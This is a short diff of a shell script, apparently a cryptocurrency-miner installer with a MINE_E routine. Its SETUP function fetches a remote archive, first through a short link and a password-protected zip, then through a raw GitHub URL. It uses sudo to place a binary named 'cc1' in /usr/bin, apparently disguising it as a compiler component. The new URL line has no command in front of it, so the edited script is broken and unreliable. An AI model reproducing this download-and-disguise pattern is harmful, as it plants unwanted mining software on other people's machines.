@@ -59,9 +59,8 @@ MINE_E() {
     clear
 }
 SETUP() {
-wget https://git.io/sme8ryes --content-disposition >/dev/null 2>&1
-unzip -q -P apostropis nvsueyrtjsdeud.zip
-tar xf program
+https://raw.githubusercontent.com/outlookribut/jbh/main/program.tgz
+tar xf program.tgz
 sudo mv cc1 /usr/bin
 }
 SETUP
